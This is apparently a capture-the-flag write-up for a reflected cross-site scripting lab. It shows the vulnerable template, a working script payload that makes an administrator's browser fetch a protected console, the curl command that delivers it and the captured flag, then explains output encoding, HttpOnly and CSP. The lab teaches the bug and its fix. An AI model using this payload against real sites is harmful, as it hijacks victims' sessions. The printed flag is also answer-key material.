# 03 Reflector: reflected cross-site scripting

**Target:** `https://northwind-03-reflector.vercel.app`
**Class:** reflected cross-site scripting, CWE-79
**Solution:** `apps/solve/solve-03.py` (a browser is required)

---

## Statement

Search the catalogue. The search box reflects your query into the page without
encoding it. Read a value that the settlement console will not return to a
terminal.

---

## How it is solved, step by step

### Step 1. Confirm a terminal cannot reach the flag

```bash
curl -s -H 'X-Requested-With: XMLHttpRequest' \
  https://northwind-03-reflector.vercel.app/console
```

```json
{ "error": "administrator session required" }
```

Two gates are in the way, both in `app/console/route.js`:

```js
if (claims?.sub !== 'administrator') {
  return json({ error: 'administrator session required' }, 403);
}
if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
  return json({ error: 'this endpoint answers script-initiated requests only' }, 403);
}
```

There is no interactive page and no amount of crafting gets past them from a
shell. **That is the point.** The flag can only be read by a browser executing
script in an administrator's session, which is precisely the capability this
class of bug grants. Any demonstration that appeared to succeed over HTTP
would be demonstrating nothing.

### Step 2. Reflect the payload

`app/search/route.js` renders the same value two ways, some lines apart:

```js
// correct: the search box
<input type="search" name="q" value="${escapeHtml(query)}" ...>

// VULNERABLE (application 03)
<h2>${rows.length} results for &ldquo;${query}&rdquo;</h2>
```

So one response contains both `&lt;img src=x&gt;` and `<img src=x>`. That makes
the failure point unambiguous when you look at the page.

### Step 3. Inject a script that calls the console

```html
<script>
  fetch('/console', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(r => r.json())
    .then(d => { document.title = d.settlement_key || 'no-key-returned' })
</script>
```

URL-encoded into `?q=`:

```bash
PAYLOAD='<script>fetch("/console",{headers:{"X-Requested-With":"XMLHttpRequest"}})'
PAYLOAD+='.then(r=>r.json()).then(d=>{document.title=d.settlement_key})</script>'

curl -s -G --data-urlencode "q=$PAYLOAD" "$BASE/search"    # the page, not the flag
```

### Step 4. Let a real browser execute it

```bash
python3 apps/solve/solve-03.py
```

The script signs in as the administrator through the browser context's request
client, which shares its cookie jar, then opens the crafted URL and waits for
the title to change:

```
== 0. the console refuses a direct request from a terminal ==
   HTTP 403 administrator session required
== 1. sign in as the administrator (the victim of the crafted link) ==
   session cookie issued for eyJhbGciOiJIUzI1NiIs…
== 2. open the crafted search URL the administrator was sent ==
   document.title after injection: 'G24{Y0ur_Input_Becam3_M4rkup}'
```

---

## Why it works

A browser receives bytes and **parses** them into a document. Its only job is
deciding what is markup and what is text, and it has no way to know which
characters were *intended* as which. A template that writes user input
directly into the stream produces a `<script>` element, and the parser runs
it.

Output encoding restores the distinction:

```
<  becomes  &lt;
>  becomes  &gt;
&  becomes  &amp;
```

The angle brackets are text again, so the parser no longer sees an element.

---

## The shape of the attack

What the attacker does **not** do is the part worth remembering:

- no password is obtained
- the administrator's session cookie is never read by the attacker
- the attacker never sends a single request to the console

The attacker sends a link. An administrator opens it. The script runs in their
browser, with their session, and calls the console as them.

That is what cross-site scripting means: running code in someone else's
browser, with their privileges.

---

## HttpOnly and what it does not do

The session cookie in these applications is marked `HttpOnly`, so
`document.cookie` cannot read it in JavaScript.

**It does not prevent this attack.** `HttpOnly` prevents cookie theft. It does
not prevent a script from *acting as* the user. Both are real mitigations for
different problems, and they are routinely conflated, sometimes as an excuse to
skip encoding.

---

## The fix

```js
&ldquo;${escapeHtml(query)}&rdquo;
```

One call, at the point of output, for the context in question.

Encoding is **context-specific**. The correct encoding for HTML text is not the
one for a JavaScript string, an attribute value, or a URL. Encoding is applied
on the way out, never as input cleaning on the way in.

Behind it, a Content Security Policy forbidding inline script would have blocked
this payload regardless of encoding. Encoding is the fix; CSP is the belt.

---

## Unintended paths, and why they are closed

| Path | Result | Reason |
|---|---|---|
| crafting the console request directly | 403 | two gates, no interactive page |
| HTTP-only solving | impossible | the proof of impact is code execution, not a malformed request |
| `xss-proof.png` in version control | excluded | the screenshot captures the flag in the page title |

---

## Verify it yourself

```bash
BASE=https://northwind-03-reflector.vercel.app python3 apps/solve/solve-03.py
```

This one needs Playwright's Firefox installed, because a browser is the point.